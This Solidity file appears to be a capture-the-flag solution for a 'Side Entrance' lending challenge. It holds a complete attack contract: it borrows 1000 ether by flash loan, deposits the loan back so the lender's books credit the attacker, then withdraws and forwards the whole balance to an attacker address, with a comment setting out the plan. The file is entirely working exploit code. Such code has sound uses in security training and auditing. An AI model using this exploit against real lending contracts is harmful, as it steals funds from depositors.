// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface ILender {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}


// Plan: take a flash loan and deposit it back into the lender contract. This will keep the balance of lender the same
// but change the mapping 'balances' to let us withdraw the ether
contract SideEntranceBorrower {
    ILender lender;
    constructor(address payable _lender) {
        lender = ILender(_lender);
    }

    function attack(address payable attacker) external {
        lender.flashLoan(1000000000000000000000);
        
        lender.withdraw();
        (bool success, ) = attacker.call{value: address(this).balance}("");
        require(success, "Call to attacker fail");
    }

    function execute() external payable {
        lender.deposit{value: 1000 ether}();
    }
    receive() external payable {}
    
}